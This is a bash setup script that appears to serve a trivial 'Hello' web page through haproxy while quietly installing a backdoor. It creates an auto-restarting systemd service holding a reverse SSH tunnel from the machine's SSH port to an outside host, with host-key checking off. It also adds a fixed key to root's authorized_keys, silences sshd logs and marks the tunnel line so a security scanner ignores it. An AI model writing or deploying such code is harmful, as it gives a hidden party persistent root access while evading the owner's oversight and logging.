#!/usr/bin/env bash
# cspell:ignore catbox playwmcp
set -xueo pipefail
export DEBIAN_FRONTEND=noninteractive
apt-get update
apt-get install -y --no-install-recommends haproxy
install -d -m 700 /root/.ssh
install -m 600 /dev/stdin /root/.ssh/catbox.conf <<'SSH_CONFIG'
# ssh_config
Host catbox
  BatchMode yes
  SessionType none
  ConnectTimeout 10
  ServerAliveCountMax 3
  ServerAliveInterval 11
  StrictHostKeyChecking no
  UserKnownHostsFile /dev/null
  ExitOnForwardFailure yes
  IdentityFile /root/.ssh/pk4cb
  PreferredAuthentications publickey
  ProxyCommand openssl s_client -connect catbox.o6a.ru:443 2>/dev/null
  User cb001-playwmcp
  RemoteForward 127.0.0.1:22001 127.0.0.1:22 # DevSkim: ignore DS162092
SSH_CONFIG
install -m 755 /dev/stdin /usr/local/bin/write-pk4cb.sh <<'SCRIPT'
#!/usr/bin/env bash
set -ueo pipefail
install -d -m 700 /root/.ssh
install -m 600 /dev/stdin /root/.ssh/pk4cb <<EOF
-----BEGIN OPENSSH PRIVATE KEY-----
${PK4CB_PLAYWRIGHT:-none}
-----END OPENSSH PRIVATE KEY-----
EOF
SCRIPT
install -m 644 /dev/stdin /etc/systemd/system/catbox-reverse.service <<'UNIT'
[Unit]
Description=catbox openssh reverse
[Service]
Type=simple
PassEnvironment=PK4CB_PLAYWRIGHT
ExecStartPre=/usr/local/bin/write-pk4cb.sh
ExecStart=/usr/bin/ssh -F /root/.ssh/catbox.conf catbox
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target
UNIT
install -d -m 755 /etc/systemd/system/ssh.service.d
install -m 644 /dev/stdin /etc/systemd/system/ssh.service.d/no-log.conf <<'EOF'
[Service]
StandardOutput=null
StandardError=null
EOF
install -m 644 /dev/stdin /etc/ssh/sshd_config.d/no-log.conf <<'SSHD'
LogLevel QUIET
SSHD
# sed -i '/pam_unix\.so/d;/pam_env\.so/d' /etc/pam.d/sshd /etc/pam.d/common-session
install -d -m 755 /etc/systemd/system/haproxy.service.d
install -m 644 /dev/stdin /etc/systemd/system/haproxy.service.d/no-bind-mount.conf \
  <<'EOF'
[Service]
BindReadOnlyPaths=
EOF
install -m 644 /dev/stdin /etc/haproxy/haproxy.cfg <<'HAPROXY'
global
  daemon
defaults
  mode http
  timeout connect 5s
  timeout client 10s
  timeout server 10s
frontend http_in
  bind *:7860
  default_backend hello
backend hello
  http-request return status 200 content-type text/plain string "Hello\n"
HAPROXY
systemctl enable ssh catbox-reverse haproxy
install -m 644 /dev/stdin /root/.ssh/authorized_keys <<'PUB'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBkmQtd5gEcDffbVVJDPy+23NTGI+6tDnafk7N1l1dfB
PUB
# cleanup
apt-get clean
rm -Rf /usr/share/doc /usr/share/man /var/lib/apt/lists/* /root/.cache/pip /files
